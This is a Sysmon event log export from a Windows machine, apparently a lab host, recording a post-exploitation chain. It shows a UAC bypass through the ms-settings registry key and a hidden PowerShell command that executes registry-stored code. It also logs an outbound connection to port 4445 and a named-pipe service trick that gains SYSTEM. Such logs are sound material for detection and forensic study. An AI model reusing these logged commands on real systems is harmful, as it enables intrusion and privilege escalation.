"Message","Id","Version","Qualifiers","Level","Task","Opcode","Keywords","RecordId","ProviderName","ProviderId","LogName","ProcessId","ThreadId","MachineName","UserId","TimeCreated","ActivityId","RelatedActivityId","ContainerLog","MatchedQueryIds","Bookmark","LevelDisplayName","OpcodeDisplayName","TaskDisplayName","KeywordsDisplayNames","Properties"
"Registry value set:
RuleName: T1031,T1050
EventType: SetValue
UtcTime: 2025-02-08 09:31:45.533
ProcessGuid: {425f3eb2-2332-67a7-0b00-000000001200}
ProcessId: 612
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\xxnhku\Start
Details: DWORD (0x00000004)
User: NT AUTHORITY\SYSTEM","13","2",,"4","13","0","-9223372036854775808","20083","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:45 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Registry value set (rule: RegistryEvent)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:45.473
ProcessGuid: {425f3eb2-2481-67a7-6f01-000000001200}
ProcessId: 748
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /c echo xxnhku > \\.\pipe\xxnhku
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {425f3eb2-2332-67a7-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {425f3eb2-2332-67a7-0b00-000000001200}
ParentProcessId: 612
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM","1","5",,"4","1","0","-9223372036854775808","20082","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:45 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Registry value set:
RuleName: T1031,T1050
EventType: SetValue
UtcTime: 2025-02-08 09:31:45.470
ProcessGuid: {425f3eb2-2332-67a7-0b00-000000001200}
ProcessId: 612
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\xxnhku\ImagePath
Details: cmd.exe /c echo xxnhku > \\.\pipe\xxnhku
User: NT AUTHORITY\SYSTEM","13","2",,"4","13","0","-9223372036854775808","20081","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:45 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Registry value set (rule: RegistryEvent)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Registry value set:
RuleName: T1031,T1050
EventType: SetValue
UtcTime: 2025-02-08 09:31:45.470
ProcessGuid: {425f3eb2-2332-67a7-0b00-000000001200}
ProcessId: 612
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\xxnhku\Start
Details: DWORD (0x00000003)
User: NT AUTHORITY\SYSTEM","13","2",,"4","13","0","-9223372036854775808","20080","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:45 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Registry value set (rule: RegistryEvent)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Registry object added or deleted:
RuleName: T1042
EventType: DeleteValue
UtcTime: 2025-02-08 09:31:40.486
ProcessGuid: {425f3eb2-2441-67a7-5901-000000001200}
ProcessId: 1476
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-2810783064-3530294918-2968498012-1000_Classes\ms-settings\shell\open\command\DelegateExecute
User: DESKTOP-F21NMCI\admin","12","2",,"4","12","0","-9223372036854775808","20079","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:40 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Registry object added or deleted (rule: RegistryEvent)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Network connection detected:
RuleName: -
UtcTime: 2025-02-08 09:31:36.465
ProcessGuid: {425f3eb2-2477-67a7-6b01-000000001200}
ProcessId: 7952
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-F21NMCI\admin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.228.130
SourceHostname: DESKTOP-F21NMCI.localdomain
SourcePort: 49763
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.228.131
DestinationHostname: -
DestinationPort: 4445
DestinationPortName: -","3","5",,"4","3","0","-9223372036854775808","20078","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4236","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:37 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Network connection detected (rule: NetworkConnect)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"File created:
RuleName: DLL
UtcTime: 2025-02-08 09:31:36.423
ProcessGuid: {425f3eb2-2478-67a7-6d01-000000001200}
ProcessId: 2512
Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
TargetFilename: C:\Users\admin\AppData\Local\Temp\apjynfwm\apjynfwm.dll
CreationUtcTime: 2025-02-08 09:31:36.345
User: DESKTOP-F21NMCI\admin","11","2",,"4","11","0","-9223372036854775808","20077","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:36 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","File created (rule: FileCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:36.419
ProcessGuid: {425f3eb2-2478-67a7-6e01-000000001200}
ProcessId: 2560
Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe
FileVersion: 14.10.25028.0 built by: VCTOOLSD15RTM
Description: Microsoft? Resource File To COFF Object Conversion Utility
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: CVTRES.EXE
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\admin\AppData\Local\Temp\RES118B.tmp"" ""c:\Users\admin\AppData\Local\Temp\apjynfwm\CSC6E0BB81FA98C45D18D521A6CA3CA9221.TMP""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-9a8d-020000000000}
LogonId: 0x28D9A
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=70D838A7DC5B359C3F938A71FAD77DB0,SHA256=E4DBDBF7888EA96F3F8AA5C4C7F2BCF6E57D724DD8194FE5F35B673C6EF724EA,IMPHASH=0FCE7AAB563778C495FB59AA62464473
ParentProcessGuid: {425f3eb2-2478-67a7-6d01-000000001200}
ParentProcessId: 2512
ParentImage: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\admin\AppData\Local\Temp\apjynfwm\apjynfwm.cmdline""
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20076","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:36 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:36.353
ProcessGuid: {425f3eb2-2478-67a7-6d01-000000001200}
ProcessId: 2512
Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
FileVersion: 4.8.3752.0 built by: NET48REL1
Description: Visual C# Command Line Compiler
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\admin\AppData\Local\Temp\apjynfwm\apjynfwm.cmdline""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-9a8d-020000000000}
LogonId: 0x28D9A
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=3C73132E652D88F4BEA6A830D44BBCDE,SHA256=934CC2D91FC8BC45046C5A55CEFCC6699547B4E44F6EEDFA73F69374463D5DFD,IMPHASH=950FB6F62526333E663D35BA72D19DDC
ParentProcessGuid: {425f3eb2-2477-67a7-6b01-000000001200}
ParentProcessId: 7952
ParentImage: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe"" -nop -w hidden -c ""IEX (Get-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name LofgxgDb).LofgxgDb""
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20075","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:36 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"File created:
RuleName: -
UtcTime: 2025-02-08 09:31:36.345
ProcessGuid: {425f3eb2-2477-67a7-6b01-000000001200}
ProcessId: 7952
Image: C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
TargetFilename: C:\Users\admin\AppData\Local\Temp\apjynfwm\apjynfwm.cmdline
CreationUtcTime: 2025-02-08 09:31:36.345
User: DESKTOP-F21NMCI\admin","11","2",,"4","11","0","-9223372036854775808","20074","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:36 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","File created (rule: FileCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
